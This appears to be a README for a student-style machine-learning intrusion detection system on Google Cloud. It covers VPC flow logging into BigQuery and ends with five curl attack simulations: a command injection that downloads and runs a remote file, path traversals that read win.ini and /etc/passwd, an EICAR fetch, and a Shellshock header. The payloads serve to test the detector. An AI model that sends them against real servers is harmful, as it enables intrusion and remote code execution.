# ML-based-real-time-intrusion-detection-system for cloud computing environments
Creating a ML based real-time intrusion detection system using Google Clouds Compute Engine


 System Model
The system model consist of a VM setup using Google Cloud Platform, the VM is an Apache Server that is a web application. The Virtual Private Cloud (VPC) network for the VM is configured to enable flow (audit) logs (both HTTPS and HTTP traffic) of the VM, the VPC plays the role of a packet sniffer for logs sent and received from the VM. The protocol used is TCP port 80,22. A sink is created to capture and store the mirrored packets from the VM, which are transformed into a BigQuery dataset. In the BigQuery database a custom SQL command is executed querying the following fields timestamp, source_ip, destination_ip, bytes_sent, src_port, dest_port, protocol, packets_sent which will be used for the IDS.

Attack Simulation using Powershell
Attack 1
curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"

Attack 2
curl http://192.168.10.20/?item=../../../../WINNT/win.ini

Attack 3
curl http://192.168.10.20/eicar.file

Attack4
curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd

Attack5
curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical

